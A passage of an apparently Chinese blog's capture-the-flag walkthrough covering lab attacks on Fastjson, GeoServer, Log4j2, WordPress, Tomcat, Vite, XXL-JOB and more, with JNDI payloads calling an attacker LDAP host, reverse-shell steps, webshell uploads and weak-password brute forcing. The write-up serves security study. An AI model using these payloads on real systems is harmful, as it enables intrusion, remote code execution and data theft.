+<h2 id="RTSP-密码爆破"><a href="#RTSP-密码爆破" class="headerlink" title="RTSP - 密码爆破"></a>RTSP - 密码爆破</h2><p>题目已经给出了 RTSP 的账号密码，或者也可以用 RTSP Cracker Pro 工具来爆破密码，得到账号密码 admin&#x2F;admin123</p>
+<p>打开 VLC 播放器，点击菜单栏的 媒体 -&gt; 打开网络串流，在弹出的对话框中，输入RTSP URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rtsp://admin:admin123@node.hackhub.get-shell.com:48787/media</span><br></pre></td></tr></table></figure>
+
+<p>即可成功播放视频，得到 flag</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/a9ZN/2046X1080/assets/image-20260109102036-cwrhqep.png" alt="image"></p>
+<h1 id="Pentest"><a href="#Pentest" class="headerlink" title="Pentest"></a>Pentest</h1><h2 id="Fastjson-1-2-47-远程代码执行"><a href="#Fastjson-1-2-47-远程代码执行" class="headerlink" title="Fastjson 1.2.47 - 远程代码执行"></a>Fastjson 1.2.47 - 远程代码执行</h2><p>在登陆处抓包，发现账号密码是通过 json 进行数据传输</p>
+<p>构造 POST 数据，删除末尾的大括号使其报错，发现是标准的 fastjson 后端</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/bNhB/1827X937/assets/network-asset-1738286428503-211e494e-c2c4-45a7-8d80-afeeaaaef028-20250131211154-341698y.png"></p>
+<p>POST 发送如下数据包，在 dnslog 上接收到请求，证明漏洞存在</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;3mqyx3.dnslog.cn&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/Hivg/1241X224/assets/network-asset-1738286657428-aaf0d66b-a694-45f0-af25-ded66fe3717a-20250131211154-yo83vam.png"></p>
+<p>利用报错查看精确版本号，fastjson1.2.47，网上自己找找相关漏洞文章</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/kJGs/1830X884/assets/network-asset-1738286779202-c9b95403-2f81-4a80-9076-e21b5477ca9a-20250131211154-7nm8q8x.png"></p>
+<p>通过恶意 JNDI 地址让靶机加载并执行远程代码，这里执行的反弹命令必须是 nc，没有 bash</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;想要执行的命令&quot;</span> -A <span class="string">&quot;攻击机的ip&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>将生成的 JNDI 地址写入 POST 数据包对应位置，攻击机开启监听，发送数据包，即可拿到 shell，执行命令得到 flag</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://ip:port/wwsebk&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="GeoServer-远程代码执行"><a href="#GeoServer-远程代码执行" class="headerlink" title="GeoServer - 远程代码执行"></a>GeoServer - 远程代码执行</h2><p>进入 geoserver 首页，先抓个包，POST 方式在 <code>/geoserver/wfs</code> 路由提交以下数据反弹 shell</p>
+<p>需要修改一下 Content-Type 为 <code>application/xml</code></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wfs:GetPropertyValue</span> <span class="attr">service</span>=<span class="string">&#x27;WFS&#x27;</span> <span class="attr">version</span>=<span class="string">&#x27;2.0.0&#x27;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:topp</span>=<span class="string">&#x27;http://www.openplans.org/topp&#x27;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:fes</span>=<span class="string">&#x27;http://www.opengis.net/fes/2.0&#x27;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:wfs</span>=<span class="string">&#x27;http://www.opengis.net/wfs/2.0&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wfs:Query</span> <span class="attr">typeNames</span>=<span class="string">&#x27;sf:archsites&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">wfs:valueReference</span>&gt;</span>exec(java.lang.Runtime.getRuntime(),&#x27;反弹shell命令&#x27;)<span class="tag">&lt;/<span class="name">wfs:valueReference</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wfs:GetPropertyValue</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Log4j2-远程代码执行"><a href="#Log4j2-远程代码执行" class="headerlink" title="Log4j2 - 远程代码执行"></a>Log4j2 - 远程代码执行</h2><p>首先利用 dnslog 判断漏洞是否存在，同时探测一下 java 版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.f9dvag.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
+
+<p>dnslog 收到请求，漏洞存在，同时判断出 java 版本是 1.8</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/LUy2/1262X196/assets/network-asset-1738290833075-db8bbaa6-e3f7-4fb9-a382-ee4d1ebea7eb-20250131211154-ivpsfkp.png"></p>
+<p>然后还是使用 JNDI 注入工具生成恶意 JNDI 地址，执行反弹 shell 命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;想要执行的命令&quot;</span> -A <span class="string">&quot;攻击机的ip&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>将生成的地址填入以下 payload 对应位置，同时攻击机开启监听，成功拿到 shell，执行命令得到 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://ip:port/flnl6n&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="MetInfo-4-0"><a href="#MetInfo-4-0" class="headerlink" title="MetInfo 4.0"></a>MetInfo 4.0</h2><p>MetInfo 4.0 存在一个修改任意用户密码的漏洞，先注册一个用户登陆，登陆后抓一个修改信息的包，将用户名修改为 admin，重放，提示操作成功，此时我们已经将管理员的信息修改为原本注册账号的信息了</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/xboa/1783X690/assets/network-asset-1738312866197-3bb315f4-5ca5-45e3-aac8-5d2a2e0dc5cf-20250131211154-sdelqu4.png"></p>
+<p>访问 <code>/admin/</code> 目录进入后台，管理员账号密码是刚修改的</p>
+<p>写一个一句话木马，打包成压缩包，在界面风格-&gt;模板管理-&gt;添加新模板处上传木马压缩包，上传后会自动将压缩包里面的 shell.php 文件解压到网站的 <code>/templates/</code> 目录下</p>
+<p>蚁剑成功连接，根目录找到 flag</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/2fHA/1537X492/assets/network-asset-1738314244373-7ea8efc6-471b-4db8-8941-170533e0f087-20250131211154-btmyadq.png"></p>
+<h2 id="Shiro550-Shiro反序列化"><a href="#Shiro550-Shiro反序列化" class="headerlink" title="Shiro550 - Shiro反序列化"></a>Shiro550 - Shiro反序列化</h2><p>特征是勾选记住密码后，登陆响应包中有 <code>Set-Cookie: rememberMe=deleteMe;</code> 字段</p>
+<p>使用 Shiro 反序列化工具一把梭</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/QOCb/1489X843/assets/network-asset-1738314396481-a643278a-f0e3-4c93-9100-9865aa5db220-20250131211154-kk3f8iu.png"></p>
+<h2 id="SpringBoot-信息泄露"><a href="#SpringBoot-信息泄露" class="headerlink" title="SpringBoot - 信息泄露"></a>SpringBoot - 信息泄露</h2><p>主界面什么都没有，dirsearch 扫一下目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u <span class="string">&quot;http://node.hackhub.get-shell.com:55748/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/Egn6/1546X612/assets/network-asset-1738328182523-30754daf-63ee-49c1-8b04-101ae06bf79d-20250131211155-da1w1w3.png">发现 <code>/admin</code> 路由是后台地址，<code>/actuator</code> 路由是所有存在的断点</p>
+<p>访问 <code>/actuator/env</code> 发现网站用户名 webadmin</p>
+<p>下载 JAVA 堆栈文件 heapdump，使用工具 JDumpSpider 提取敏感信息，命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar .\JDumpSpider.jar .\heapdump</span><br></pre></td></tr></table></figure>
+
+<p>得到后台账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.username = webadmin</span><br><span class="line">admin.password = adminweb</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/admin/</code> 路由登陆后台即可得到 flag</p>
+<h2 id="ThinkPHP-5-0-23-远程代码执行"><a href="#ThinkPHP-5-0-23-远程代码执行" class="headerlink" title="ThinkPHP 5.0.23 - 远程代码执行"></a>ThinkPHP 5.0.23 - 远程代码执行</h2><p>thinkphp 综合利用工具一把梭</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/Rotp/1803X998/assets/network-asset-1738314672355-c643567f-5c6b-43cf-93e1-de4aaae5e9f5-20250131211155-nxcf6jg.png"></p>
+<h2 id="WordPress-“花咲雨町”"><a href="#WordPress-“花咲雨町”" class="headerlink" title="WordPress - “花咲雨町”"></a>WordPress - “花咲雨町”</h2><p>靶机搭建的应用程序是 WordPress，在 <code>/wp-json/wp/v2/users API</code> 端点可以查看用户列表，访问发现只有一个用户，用户名为 webadmin</p>
+<p>在 <code>xmlrpc.php</code> 文件下通过 POST 方式发送数据，查询可以使用哪些方法</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>system.listMethods<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有很多方法可以用，使用 wp.getUsersBlogs 方法来爆破密码，数据包如下</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>password<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/7jYN/1848X904/assets/network-asset-1738318858850-1a614923-098b-4652-9b0f-1ebff112cda3-20250131211155-780ah34.png"></p>
+<p>爆破得到密码为 admin123，登陆后台，在后台管理-&gt;插件-&gt;上传插件处上传我们下载好的插件</p>
+<p>在 WordPress 官方地址下载插件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cn.wordpress.org/plugins/</span><br></pre></td></tr></table></figure>
+
+<p>随便下载一个然后在插件目录下写一个 shell.php，再重新打包上传到后台插件处上传</p>
+<p>启用插件，查看可以看到插件已经成功加载，shell.php 文件也存在</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/14Ha/1964X1042/assets/network-asset-1738319749946-7353cf1c-6744-46b4-b0c4-48596a2def7b-20250131211155-63xucev.png"></p>
+<p>WordPress 的插件目录在 <code>/wp-content/plugins/</code>，后面加上自己下载的插件目录和木马名，蚁剑连接成功，在根目录下得到 flag</p>
+<h2 id="哪吒监控"><a href="#哪吒监控" class="headerlink" title="哪吒监控"></a>哪吒监控</h2><p>默认账号密码 <code>admin/admin</code> 登陆，直接进入命令行执行命令</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/BEeo/1952X773/assets/network-asset-1738315296911-898585a1-9c67-4379-9db4-3e3004de72fd-20250131211155-yddrgc1.png"></p>
+<h2 id="彩虹目录列表"><a href="#彩虹目录列表" class="headerlink" title="彩虹目录列表"></a>彩虹目录列表</h2><p>进入后台管理，弱口令爆破得到账号密码为 <code>admin/123456</code>， 登陆后台后进入首页可以任意上传文件</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/pllQ/1962X1220/assets/network-asset-1738315937668-5ecda6fe-cb7f-4905-82b2-3aec6b5ae50d-20250131211155-abh8iyh.png"></p>
+<p>直接上传一句话木马，访问连接即可</p>
+<h2 id="朵米客服平台"><a href="#朵米客服平台" class="headerlink" title="朵米客服平台"></a>朵米客服平台</h2><p>首先注册登陆进入后台，在后台系统设置-&gt;广告设置处可以上传图片，bp 抓一个上传文件的包</p>
+<p>修改 POST 数据包，将 <code>data:image/jpeg</code> 更改为 <code>data:image/php</code>，base64 的内容替换为 base64 编码的一句话木马，成功上传</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/YpIy/1830X731/assets/network-asset-1738317666507-e33ed717-e792-4566-a90b-2b14d401aa15-20250131211155-4etiooo.png"></p>
+<p>拼接 url 地址，蚁剑成功连接，根目录下找到 flag</p>
+<h2 id="Git-目录信息泄露"><a href="#Git-目录信息泄露" class="headerlink" title=".Git - 目录信息泄露"></a>.Git - 目录信息泄露</h2><p>使用 dirsearch 目录扫描，发现存在 <code>.git</code> 目录，目录下还有很多文件</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/PQwt/1823X866/assets/image-20251002181714-43li9m1.png" alt="image"></p>
+<p>先使用 githacker 将 <code>.git</code> 目录打包下载下来，然后使用 lazygit 工具查看之前的提交，得到 flag</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">githacker --url http://example.com/.git/ --output-folder result</span><br><span class="line">lazygit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/b9Uu/2112X1116/assets/image-20251002182746-z9c8afn.png" alt="image"></p>
+<h2 id="Alist-粗心的配置"><a href="#Alist-粗心的配置" class="headerlink" title="Alist - 粗心的配置"></a>Alist - 粗心的配置</h2><p>访问靶机，是一些文件，将 <code>.bash_history</code> 文件下载下来，发现里面写有账号密码信息，admin&#x2F;123456</p>
+<p>登陆后即可管理存储信息，将页面显示的文件由 <code>/root</code> 改为 <code>/</code> 下的文件，保存</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/cbn0/2017X1029/assets/image-20251002184146-fv24w7f.png" alt="image"></p>
+<p>再次访问主界面就可以看到机器根目录下的文件，得到 flag</p>
+<h2 id="Druid-未授权登录爆破"><a href="#Druid-未授权登录爆破" class="headerlink" title="Druid - 未授权登录爆破"></a>Druid - 未授权登录爆破</h2><p>点击数据看板，提示 <code>Hi，这是一个API接口，看看API路径有什么吧！</code></p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/EtgX/2022X1094/assets/image-20251003082429-nberk1y.png" alt="image"></p>
+<p>根据提示，我们对 <code>/api/</code> 目录进行爆破，扫到 druid 的登陆界面 <code>/api/druid/login.html</code></p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/r7rI/1827X465/assets/image-20251003082734-oxtqf9k.png" alt="image"></p>
+<p>猜测账号名为 <code>druid</code>，弱口令爆破得到账号密码 <code>druid/123456</code>，登陆进去即可得到 flag</p>
+<h2 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h2><p>题目提示存在 CVE-2017-7504 反序列化漏洞</p>
+<p>访问 <code>/jbossmq-httpil/HTTPServerILServlet</code>，出现如下界面，说明漏洞存在</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/TwyO/2030X1088/assets/image-20251003084310-le25sm3.png" alt="image"></p>
+<p>手工没复现出来不知道什么原因，shell 一直弹不上，这里直接工具一把梭了</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/x7Ec/964X366/assets/image-20251003090027-txuh69h.png" alt="image"></p>
+<h2 id="JWT-Token-垂直越权漏洞"><a href="#JWT-Token-垂直越权漏洞" class="headerlink" title="JWT Token - 垂直越权漏洞"></a>JWT Token - 垂直越权漏洞</h2><p>在 cookie 中拿到 jwt，使用的是 HS256 算法，爆破拿到密钥 123456，修改 login_user_key 字段为 admin，再重新加密，将重新加密后的 jwt 放入cookie 中，刷新即可进入管理员界面</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/DSOV/2002X1172/assets/image-20251003092254-jiajb1u.png" alt="image"></p>
+<p>进入后台之后，根据提示，在 用户管理-&gt;备注 中拿到 flag</p>
+<h2 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h2><p>进入后显示 404，拼接 <code>/nacos</code> 路由进入登陆界面</p>
+<p>测试发现可以未授权查看用户信息，拼接如下路由即可看到系统中的登陆用户，得到 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/nacos/v1/auth/users?pageNo=1&amp;pageSize=10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/3k1m/2013X595/assets/image-20251003092545-2wuxrmp.png" alt="image"></p>
+<h2 id="Tomcat-Manager-恶意文件上传"><a href="#Tomcat-Manager-恶意文件上传" class="headerlink" title="Tomcat Manager - 恶意文件上传"></a>Tomcat Manager - 恶意文件上传</h2><p>弱口令 <code>tomcat/tomcat</code> 登陆后台，后台处可以上传恶意的 war 文件</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/RJhS/1983X199/assets/image-20251003092957-hzuuxr7.png" alt="image"></p>
+<p>将天蝎权限管理工具自带的 jsp webshell 压缩，得到恶意 war 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar cvf api.war api.jsp</span><br></pre></td></tr></table></figure>
+
+<p>上传该 war 文件，访问 <code>/api/api.jsp</code> 路由，发现成功解析，天蝎成功连接，拿到 flag</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/QnPt/1460X398/assets/image-20251003093438-mvfckao.png" alt="image"></p>
+<h2 id="Vite开发服务器-任意文件读取"><a href="#Vite开发服务器-任意文件读取" class="headerlink" title="Vite开发服务器 - 任意文件读取"></a>Vite开发服务器 - 任意文件读取</h2><p>CVE-2025-30208，利用非常简单，直接拼接 <code>/@fs/flag?import&amp;raw??</code> 即可拿到 flag</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/sHAS/2020X273/assets/image-20251003093817-1zv5nto.png" alt="image"></p>
+<h2 id="Elasticsearch-未授权访问"><a href="#Elasticsearch-未授权访问" class="headerlink" title="Elasticsearch - 未授权访问"></a>Elasticsearch - 未授权访问</h2><p>首先安装浏览器插件 Elasticvue，添加 elasticsearch 集群，填写靶机地址进行连接</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/KrxR/2129X985/assets/image-20260109104240-mbfqugn.png" alt="image"></p>
+<p>成功连接后，在 索引 -&gt; dev_backup_hidden 里得到 flag</p>
+<h2 id="XXLJOB-弱口令命令执行"><a href="#XXLJOB-弱口令命令执行" class="headerlink" title="XXLJOB - 弱口令命令执行"></a>XXLJOB - 弱口令命令执行</h2><p>访问后台地址 <code>/xxl-job-admin</code>，默认账号密码 admin&#x2F;123456 登陆后台</p>
+<p>登陆成功后在 任务管理  处新增任务，运行模式选择 <code>GLUE(Shell)</code>，其他随便填</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/3jPG/2157X996/assets/image-20260109105919-kexa7vd.png" alt="image"></p>
+<p>填完之后点击保存配置，然后选中该任务，配置 GLUE IDE，编辑需要执行的命令，如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/lwug/1764X574/assets/image-20260109110054-wb4pdfw.png" alt="image"></p>
+<p>配置好之后依次点击 执行一次 -&gt; 查询日志 -&gt; 执行日志，即可看到命令执行的结果，得到 flag</p>
+<h2 id="JAVA-CC-反序列化"><a href="#JAVA-CC-反序列化" class="headerlink" title="JAVA CC - 反序列化"></a>JAVA CC - 反序列化</h2><p>打开是个登陆框，爆破得到账号密码 admin&#x2F;admin123</p>
+<p>登陆后，随便抓个包，可以看到 cookie 处有一个 <code>OA_SESSION</code> 参数，内容是 base64 编码的 java 反序列化数据</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/3Wks/2196X901/assets/image-20260109111741-laxxh8l.png" alt="image"></p>
+<p>Yakit 真是很方便了，用它自带的工具就能完成测试，首先用 DNSLog 生成一个域名用来测试命令执行情况，然后用 Yso-Java Hack 生成命令</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/cQk9/2190X860/assets/image-20260109112404-ukva3z1.png" alt="image"></p>
+<p>经测试用 CC6 链可以成功回显</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/EHNV/2187X646/assets/image-20260109112440-r5yce45.png" alt="image"></p>
+<p>构造反弹 shell 命令，攻击机开启监听，拿到 shell，执行命令得到 flag</p>
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>靶场通关</tag>
       </tags>
   </entry>
 </search>
